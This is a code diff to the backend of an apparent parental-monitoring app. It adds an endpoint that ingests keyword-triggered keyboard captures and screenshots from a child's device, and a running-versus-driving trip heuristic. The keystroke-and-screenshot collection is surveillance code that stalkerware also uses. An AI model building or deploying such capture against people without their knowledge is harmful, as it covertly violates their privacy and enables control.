@@ -16,6 +16,7 @@ import { SocialMessage } from '../models/SocialMessage';
 import { ChildNotification } from '../models/ChildNotification';
 import { LocationLog } from '../models/LocationLog';
 import { DrivingTrip } from '../models/DrivingTrip';
+import { KeyboardLog } from '../models/KeyboardLog';
 import { Device } from '../models/Device';
 import { uploadMediaToR2 } from '../services/r2.service';
 import { sendFcmTopicNotification } from '../services/fcm.service';
@@ -1242,14 +1243,16 @@ export const ingestDrivingTrips = async (req: Request, res: Response) => {
       const endTime = item.endTime ? new Date(item.endTime) : new Date();
       const dateStr = item.date || getLocalDateString(startTime);
 
+      const avgSpd = Number(item.avgSpeedKmH) || 0;
       const docData: any = {
         deviceId,
         tripId: item.tripId,
         status: item.status || 'Completed',
+        activityMode: item.activityMode || (avgSpd > 0 && avgSpd <= 12 ? 'RUNNING' : 'DRIVING'),
         distanceKm: Number(item.distanceKm) || 0,
         durationSeconds: Number(item.durationSeconds) || 0,
         durationText: item.durationText || '0m00s',
-        avgSpeedKmH: Number(item.avgSpeedKmH) || 0,
+        avgSpeedKmH: avgSpd,
         maxSpeedKmH: Number(item.maxSpeedKmH) || 0,
         startTime,
         endTime,
@@ -1281,6 +1284,65 @@ export const ingestDrivingTrips = async (req: Request, res: Response) => {
     return res.status(500).json({ success: false, message: error.message });
   }
 };
+
+/**
+ * Batch Ingest Keyboard Logs from Child App
+ */
+export const ingestKeyboardLogs = async (req: Request, res: Response) => {
+  try {
+    const rawLogs = req.body.logs || req.body.keyboardLogs || (Array.isArray(req.body) ? req.body : []);
+    const topDeviceId = req.body.deviceId;
+    if (!Array.isArray(rawLogs) || rawLogs.length === 0) {
+      return res.status(400).json({ success: false, message: 'Invalid or empty keyboard logs payload' });
+    }
+
+    const docsToInsert: any[] = [];
+    for (const item of rawLogs) {
+      const deviceId = item.deviceId || topDeviceId;
+      if (!deviceId || !item.matchedKeyword) continue;
+
+      let screenshotUrl = item.screenshotUrl || '';
+      // If base64 screenshot provided, upload to Cloudflare R2
+      if (!screenshotUrl && item.screenshotBase64) {
+        try {
+          const cleanBase64 = item.screenshotBase64.replace(/^data:image\/\w+;base64,/, '');
+          const buffer = Buffer.from(cleanBase64, 'base64');
+          const folderName = `keyboard-captures/${deviceId}`;
+          screenshotUrl = await uploadMediaToR2(buffer, folderName, 'webp', 'image/webp');
+        } catch (e: any) {
+          console.warn('[INGEST-KEYBOARD] R2 image upload warning:', e?.message);
+        }
+      }
+
+      docsToInsert.push({
+        deviceId,
+        matchedKeyword: String(item.matchedKeyword).trim(),
+        packageName: String(item.packageName || 'unknown').trim(),
+        appName: String(item.appName || item.packageName || 'App').trim(),
+        appIcon: item.appIcon || '',
+        capturedText: item.capturedText || '',
+        screenshotBase64: item.screenshotBase64 || '',
+        screenshotUrl: screenshotUrl || '',
+        timestamp: item.timestamp ? new Date(item.timestamp) : new Date(),
+      });
+    }
+
+    if (docsToInsert.length > 0) {
+      await KeyboardLog.insertMany(docsToInsert);
+    }
+
+    const targetDevId = topDeviceId || docsToInsert[0]?.deviceId;
+    if (targetDevId) {
+      await Device.findOneAndUpdate({ deviceId: targetDevId }, { $set: { lastKeyboardSyncTime: new Date() } });
+    }
+
+    return res.json({ success: true, count: docsToInsert.length });
+  } catch (error: any) {
+    console.error('[INGEST-KEYBOARD-LOGS] Error:', error);
+    return res.status(500).json({ success: false, message: error.message });
+  }
+};
+
 
 
 
